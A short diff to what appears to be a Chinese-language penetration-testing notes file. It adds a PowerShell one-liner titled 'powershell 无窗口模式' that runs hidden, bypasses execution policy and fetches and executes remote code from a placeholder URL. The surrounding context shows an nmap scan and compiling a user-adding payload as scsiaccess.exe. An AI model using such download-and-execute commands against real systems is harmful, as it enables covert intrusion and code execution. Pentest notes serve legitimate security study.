@@ -234,6 +234,13 @@ nmap -sV -sC -p 21,80 -oA scans/nmap-scripts 10.10.10.5
 
 ```
 i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c
+
+#### powershell 无窗口模式
+
+```
+Powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass IEX (New-Object Net.WebClient).DownloadString(‘[PowerShell URL]’); [Parameters]
+```
+
 ```
 
 ### buffer overflow
